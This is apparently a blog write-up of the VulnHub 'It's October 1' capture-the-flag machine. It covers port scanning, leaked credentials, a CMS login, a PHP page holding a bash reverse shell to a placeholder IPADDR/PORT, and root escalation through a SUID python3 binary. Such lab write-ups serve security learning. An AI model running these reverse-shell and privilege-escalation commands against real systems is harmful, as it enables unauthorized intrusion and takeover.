---
layout: post
title:  "VULNHUB - It's October 1"
date:   2020-04-15 21:17:13 +0200
categories: ctf
---
# CTF WALKTHROUGH

**Machine:** It's October<br>
**Creator:** Akanksha Sachin Verma<br>
**IP:** 192.168.1.13<br>
**Link:** https://www.vulnhub.com/entry/its-october-1,460/

This is a really easy CTF available on Vulnhub, let's resolve it!

**Enumeration**<br>
First thing I did,as always, is run a port scan to understand what services the machine is running.

{% highlight ruby %}
$ nmap -sV -v -T4 192.168.1.13

22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

So there are two webserver hosted at *http://192.168.1.13:80* and *http://192.168.1.13:8080*.
<br>
I started by looking at the host *http://192.168.1.13:8080* and found a file called *mynote.txt* containing credentials.

{% highlight html %}
$  curl http://192.168.1.13:8080/
	<a href="mynote.txt">My Note</a>
{% endhighlight %}


{% highlight text %}
$  curl http://192.168.1.13:8080/mynote.txt
	user 		- admin
	password 	- adminadmin2 
{% endhighlight %}

**Web-shell**<br>
The first question that bumped in my mind was: "Where can I use these credentials?" and for this reason i used *DirBuster* to see if there's any backend/login available. Note that BurpSuite can do this job easily even if there are alternative solutions such as *wfuzz* that are alot faster.<br>
After running *DirBuster* i almost instantly discovered the login page, located at: *http://192.168.1.13/backend* and I was able to log-in.<br>

Now it's time to think about how to get a reverse shell, after trying some public exploits such as *CVE-2018-1999009* and others nothing seemed to work.<br>
There was an option to upload new media files but the allowed extensions weren't good to upload a shell.<br>
After a little bit of try harding I was able to get a reverse shell thanks to the *CMS* section of the website.
1. Run a local listener
2. Create a New Page under *CMS->Pages*
3. Give random title and filename
4. Add page with below source code
5. Visit the page
{% highlight php %}
function onstart(){ 
    exec("/bin/bash -c 'bash -i > /dev/tcp/IPADDR/PORT 0>&1'");
}
{% endhighlight %}

{% highlight php %}
curl http://192.168.1.13/nameofthepage
{% endhighlight %}

If you did everything correctly a shell will pop-up in the nc listener, to upgrade it to full TTY we just have to run
{% highlight python %}
python -c 'import pty; pty.spawn("/bin/bash")'
{% endhighlight %}


**Privilege escalation**<br>
Looking at the files on the webserver I found nothing interesting so I decided to look for SUID files with the following command:
{% highlight bash %}
find / -perm -u=s -type f 2>/dev/null
{% endhighlight %}
And found out in the list *python3* which is perfect to gain root privileges.<br>
What I had to do is simply run a python3 script that will create a tty shell with root privileges.
{% highlight bash %}
python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
{% endhighlight %}
{% highlight bash %}
$ id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
{% endhighlight %}

So now it's time to cd into /root/ and see if we got the flag!
{% highlight bash %}
$ cat /root/proof.txt
Best of Luck
$2y$12$EUztpmoFH8LjEzUBVyNKw.9AKf37uZWPxJp.A3eop2ff0LbLYZrFq
{% endhighlight %}


Nice, we PWNED it!!